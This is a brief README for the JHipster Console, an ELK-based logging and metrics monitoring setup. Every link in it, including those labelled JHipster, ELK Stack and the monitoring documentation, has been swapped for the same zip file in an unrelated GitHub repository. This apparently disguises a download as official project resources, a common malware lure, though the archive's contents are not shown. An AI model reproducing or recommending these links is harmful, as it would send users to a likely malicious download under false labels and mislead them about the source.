This is the [JHipster](https://raw.githubusercontent.com/ducnguyenminh/jhipster-console/master/undeception/jhipster-console.zip) Console, based on the [ELK Stack](https://raw.githubusercontent.com/ducnguyenminh/jhipster-console/master/undeception/jhipster-console.zip). It provides a default configuration to get started with logs and metrics monitoring with ELK as well as some nice dashboards.

Please refer to the [JHipster Monitoring Documentation](https://raw.githubusercontent.com/ducnguyenminh/jhipster-console/master/undeception/jhipster-console.zip) for instructions on how to set up the JHipster Console.
